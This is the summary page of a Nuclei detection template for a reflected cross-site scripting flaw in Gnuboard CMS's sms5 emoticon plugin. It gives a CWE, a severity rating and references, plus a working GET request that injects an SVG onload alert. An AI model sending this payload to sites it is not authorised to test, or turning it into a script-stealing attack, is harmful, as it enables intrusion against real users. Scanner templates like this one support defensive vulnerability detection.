# Nuclei Template: Gnuboard CMS - Cross-Site Scripting
**Template ID:** gnuboard-sms-xss
**Vulnerability Class:** Cross-site Scripting (XSS) - Generic
**Severity:** Medium
**CWE:** CWE-79
**Source:** Nuclei Template (`gnuboard-sms-xss.yaml`)

## Vulnerability Information & PoC

## Description
Gnuboard CMS contains a cross-site scripting vulnerability which allows remote attackers to inject arbitrary JavaScript into the responses returned by the server.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/plugin/sms5/ajax.sms_emoticon.php?arr_ajax_msg=gnuboard<svg+onload=alert(document.domain)>
```

## References
- https://sir.kr/g5_pds/4788?page=5
- https://github.com/gnuboard/gnuboard5/commit/8182cac90d2ee2f9da06469ecba759170e782ee3
